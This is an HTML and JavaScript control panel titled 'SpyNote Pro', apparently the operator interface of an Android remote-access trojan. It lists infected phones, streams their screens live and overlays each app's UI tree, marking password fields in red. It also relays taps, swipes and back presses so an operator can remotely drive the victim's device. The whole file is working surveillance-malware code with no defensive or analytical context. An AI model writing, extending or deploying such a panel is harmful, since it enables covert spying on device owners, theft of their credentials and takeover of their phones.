<!DOCTYPE html>
<html>
<head>
    <title>üì± SpyNote Pro - Layout Controller</title>
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <script src="/socket.io/socket.io.js"></script>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body { 
            font-family: 'Segoe UI', Arial, sans-serif; 
            background: linear-gradient(135deg, #0f0f23, #1a1a2e, #16213e); 
            color: white; height: 100vh; overflow: hidden;
        }
        #devices {
            position: fixed; top: 15px; left: 15px; 
            background: rgba(0,0,20,0.95); padding: 20px; 
            max-height: 85vh; overflow-y: auto; width: 280px; 
            border-radius: 15px; backdrop-filter: blur(20px); border: 1px solid #00ff88;
        }
        .device { padding: 15px; margin: 10px 0; background: rgba(20,20,40,0.8); 
            cursor: pointer; border-radius: 10px; transition: all 0.3s; border-left: 4px solid #444; }
        .device:hover { background: rgba(0,255,136,0.2); border-left-color: #00ff88; transform: translateX(8px); }
        .active { background: linear-gradient(90deg, #00ff88, #00cc6a) !important; color: #000; border-left-color: #006633; }
        .disconnected { opacity: 0.5; border-left-color: #ff4444; }

        #phone-frame {
            width: 420px; height: 900px; margin: 30px auto; 
            background: linear-gradient(145deg, #1a1a1a, #0d0d0d); 
            border: 30px solid #2a2a3a; border-radius: 60px; 
            position: relative; cursor: pointer; touch-action: none;
            box-shadow: 0 30px 60px rgba(0,0,0,0.7), inset 0 2px 10px rgba(255,255,255,0.1);
        }
        #screen { 
            width: 100%; height: 100%; background: #111; border-radius: 25px;
            position: relative; overflow: hidden;
        }
        #layout-overlay {
            position: absolute; top: 0; left: 0; width: 100%; height: 100%;
            pointer-events: none; z-index: 10;
        }
        .layout-element {
            position: absolute; border: 2px solid rgba(0,255,136,0.6); 
            background: rgba(0,255,136,0.1); border-radius: 4px;
            transition: all 0.2s; pointer-events: none;
            font-size: 10px; padding: 2px; font-family: monospace;
        }
        .layout-element:hover { border-color: #ffaa00; background: rgba(255,170,0,0.2); }
        .clickable { border-color: #00ff88 !important; box-shadow: 0 0 10px rgba(0,255,136,0.5); }
        .password { border-color: #ff4444 !important; background: rgba(255,68,68,0.3); }

        #status { position: fixed; top: 15px; right: 15px; background: rgba(0,20,0,0.9); 
            padding: 15px; border-radius: 10px; font-size: 13px; border: 1px solid #00ff88; }
        #fps-counter { position: fixed; top: 15px; right: 200px; font-size: 13px; color: #00ff88; }
        #controls { text-align: center; position: fixed; bottom: 25px; left: 50%; transform: translateX(-50%); }
        button {
            padding: 18px 35px; margin: 0 12px; background: linear-gradient(45deg, #00ff88, #00cc6a); 
            color: #000; border: none; border-radius: 30px; cursor: pointer; font-size: 16px; 
            font-weight: bold; transition: all 0.3s; box-shadow: 0 8px 25px rgba(0,255,136,0.4);
        }
        button:hover { transform: translateY(-3px); box-shadow: 0 12px 35px rgba(0,255,136,0.6); }
        button:active { transform: translateY(0); }
        #toggle-layout { background: linear-gradient(45deg, #ffaa00, #ff8800); }
        #info-panel {
            position: fixed; bottom: 100px; left: 50%; transform: translateX(-50%);
            background: rgba(0,0,0,0.9); padding: 15px; border-radius: 10px; max-width: 500px;
            display: none;
        }
    </style>
</head>
<body>
    <div id="devices">
        <h3>üì± Connected Devices</h3>
        <div id="device-list">Loading devices...</div>
    </div>
    
    <div id="status">
        <div>Status: <span id="connectionStatus">Connecting...</span></div>
        <div>FPS: <span id="fps">0</span> | Layout: <span id="layoutStatus">OFF</span> | Device: <span id="selectedDevice">-</span></div>
    </div>
    <div id="fps-counter">FPS: 0 | Layout Elements: 0</div>

    <div id="phone-frame">
        <div id="screen">
            <canvas id="screen-canvas"></canvas>
            <div id="layout-overlay"></div>
        </div>
    </div>

    <div id="controls">
        <button onclick="sendBack()">üîô Back</button>
        <button id="toggle-layout" onclick="toggleLayout()">üó∫Ô∏è Layout</button>
        <button onclick="toggleFullScreen()">üì± Fullscreen</button>
    </div>

    <div id="info-panel">
        <div id="element-info">Hover over elements to see details</div>
    </div>

    <script>
        const socket = io({ transports: ['websocket'] });
        let currentDevice = null;
        let deviceWidth = 1080, deviceHeight = 1920;
        let lastFrameTime = 0, frameCount = 0;
        let layoutData = [];
        let showLayout = false;
        let layoutElements = 0;

        const canvas = document.getElementById('screen-canvas');
        const ctx = canvas.getContext('2d');
        const phoneFrame = document.getElementById('phone-frame');
        const overlay = document.getElementById('layout-overlay');
        const deviceList = document.getElementById('device-list');
        const connectionStatus = document.getElementById('connectionStatus');
        const selectedDeviceSpan = document.getElementById('selectedDevice');
        const fpsDisplay = document.getElementById('fps');
        const layoutStatus = document.getElementById('layoutStatus');
        const fpsCounter = document.getElementById('fps-counter');
        const infoPanel = document.getElementById('info-panel');
        const elementInfo = document.getElementById('element-info');

        socket.on('connect', () => {
            connectionStatus.textContent = '‚úÖ Connected';
            connectionStatus.style.color = '#00ff88';
        });

        socket.on('devices-update', (devices) => {
            updateDeviceList(devices);
        });

        // ‚úÖ SCREEN RENDERING
        socket.on('screen-frame', (data) => {
            if (data.deviceId !== currentDevice) return;
            
            try {
                deviceWidth = data.width;
                deviceHeight = data.height;
                
                const img = new Image();
                img.onload = () => {
                    const rect = phoneFrame.getBoundingClientRect();
                    canvas.width = rect.width;
                    canvas.height = rect.height;
                    
                    ctx.imageSmoothingEnabled = false;
                    ctx.drawImage(img, 0, 0, rect.width, rect.height);
                    
                    frameCount++;
                    const now = performance.now();
                    if (now - lastFrameTime >= 1000) {
                        const fps = Math.round(frameCount * 1000 / (now - lastFrameTime));
                        fpsDisplay.textContent = fps;
                        fpsCounter.textContent = `FPS: ${fps} | Layout Elements: ${layoutElements}`;
                        frameCount = 0;
                        lastFrameTime = now;
                    }
                };
                img.src = 'data:image/jpeg;base64,' + data.data;
            } catch (e) {
                console.error('Screen update error:', e);
            }
        });

        // ‚úÖ LAYOUT DATA (FULL UI TREE)
        socket.on('layout-data', (data) => {
            if (data.deviceId !== currentDevice) return;
            layoutData = data.layout;
            layoutElements = layoutData.length;
            if (showLayout) renderLayoutOverlay();
        });

        function renderLayoutOverlay() {
            overlay.innerHTML = '';
            if (!showLayout || !layoutData.length) return;

            const rect = phoneFrame.getBoundingClientRect();
            const scaleX = deviceWidth / rect.width;
            const scaleY = deviceHeight / rect.height;

            layoutData.forEach((element, index) => {
                try {
                    const bounds = element.bounds;
                    const elRect = {
                        left: (bounds.left / scaleX),
                        top: (bounds.top / scaleY),
                        width: ((bounds.right - bounds.left) / scaleX),
                        height: ((bounds.bottom - bounds.top) / scaleY)
                    };

                    const elDiv = document.createElement('div');
                    elDiv.className = `layout-element ${element.clickable ? 'clickable' : ''} ${element.password ? 'password' : ''}`;
                    elDiv.style.left = elRect.left + 'px';
                    elDiv.style.top = elRect.top + 'px';
                    elDiv.style.width = elRect.width + 'px';
                    elDiv.style.height = elRect.height + 'px';

                    // Tooltip
                    const tooltip = document.createElement('div');
                    tooltip.style.position = 'absolute';
                    tooltip.style.left = '2px';
                    tooltip.style.top = '2px';
                    tooltip.style.fontSize = '9px';
                    tooltip.style.color = element.clickable ? '#00ff88' : '#aaa';
                    tooltip.style.maxWidth = '100px';
                    tooltip.style.overflow = 'hidden';
                    tooltip.textContent = (element.text || element.contentDesc || '').substring(0, 20) + '...';
                    elDiv.appendChild(tooltip);

                    elDiv.addEventListener('mouseenter', () => showElementInfo(element));
                    overlay.appendChild(elDiv);
                } catch (e) {
                    console.error('Layout render error:', e);
                }
            });
        }

        function showElementInfo(element) {
            elementInfo.innerHTML = `
                <strong>${element.className || 'Unknown'}</strong><br>
                Text: ${element.text || 'N/A'}<br>
                ID: ${element.id || 'N/A'}<br>
                Clickable: ${element.clickable ? '‚úÖ YES' : '‚ùå NO'}<br>
                Password: ${element.password ? 'üîí YES' : 'NO'}
            `;
            infoPanel.style.display = 'block';
        }

        function updateDeviceList(devices) {
            deviceList.innerHTML = devices.length ? 
                devices.map(([id, info]) => `
                    <div class="device ${!info.connected ? 'disconnected' : ''}" 
                         onclick="selectDevice('${id}', this)">
                        <b>${info.model?.slice(0,12) || id.slice(0,8)}</b><br>
                        <small>${info.brand || ''} ${info.version || ''}</small><br>
                        <span style="font-size:11px">${info.connected ? 'üü¢ LIVE' : 'üî¥ OFFLINE'}</span>
                    </div>
                `).join('') : '<div style="text-align:center;padding:20px;color:#666">No devices connected</div>';
        }

        function selectDevice(deviceId, el) {
            currentDevice = deviceId;
            selectedDeviceSpan.textContent = deviceId.slice(0,8);
            document.querySelectorAll('.device').forEach(d => d.classList.remove('active'));
            el.classList.add('active');
            socket.emit('select-device', { deviceId });
            console.log('‚úÖ Selected:', deviceId);
        }

        function toggleLayout() {
            showLayout = !showLayout;
            layoutStatus.textContent = showLayout ? 'ON' : 'OFF';
            document.getElementById('toggle-layout').textContent = showLayout ? 'üñºÔ∏è Screenshot' : 'üó∫Ô∏è Layout';
            if (showLayout) {
                renderLayoutOverlay();
            } else {
                overlay.innerHTML = '';
            }
        }

        // ‚úÖ PERFECT TOUCH/MOUSE CONTROL
        let startX = 0, startY = 0, dragging = false;

        function getScaledCoords(clientX, clientY) {
            const rect = phoneFrame.getBoundingClientRect();
            const scaleX = deviceWidth / rect.width;
            const scaleY = deviceHeight / rect.height;
            return {
                x: Math.floor((clientX - rect.left) * scaleX),
                y: Math.floor((clientY - rect.top) * scaleY)
            };
        }

        ['mousedown', 'touchstart'].forEach(event => {
            phoneFrame.addEventListener(event, e => {
                e.preventDefault();
                dragging = true;
                const coords = getScaledCoords(
                    e.touches?.[0]?.clientX || e.clientX,
                    e.touches?.[0]?.clientY || e.clientY
                );
                startX = coords.x; startY = coords.y;
                sendTap(startX, startY);
            });
        });

        ['mousemove', 'touchmove'].forEach(event => {
            phoneFrame.addEventListener(event, e => {
                if (!dragging || !currentDevice) return;
                e.preventDefault();
                const coords = getScaledCoords(
                    e.touches?.[0]?.clientX || e.clientX,
                    e.touches?.[0]?.clientY || e.clientY
                );
                sendSwipe(startX, startY, coords.x, coords.y);
            });
        });

        ['mouseup', 'touchend'].forEach(event => {
            phoneFrame.addEventListener(event, e => dragging = false);
        });

        function sendTap(x, y) {
            if (!currentDevice) return;
            socket.emit('control', { 
                deviceId: currentDevice, 
                action: 'tap', 
                x, y 
            });
            console.log('üëÜ Tap:', x, y);
        }

        function sendSwipe(sx, sy, ex, ey) {
            if (!currentDevice) return;
            socket.emit('control', { 
                deviceId: currentDevice, 
                action: 'swipe', 
                startX: sx, startY: sy, 
                endX: ex, endY: ey 
            });
        }

        function sendBack() {
            if (!currentDevice) return;
            socket.emit('control', { deviceId: currentDevice, action: 'back' });
        }

        function toggleFullScreen() {
            if (!document.fullscreenElement) {
                document.documentElement.requestFullscreen();
            } else {
                document.exitFullscreen();
            }
        }

        // Initial load
        setTimeout(() => fetch('/devices').then(r => r.json()).then(updateDeviceList), 1000);
    </script>
</body>
</html>
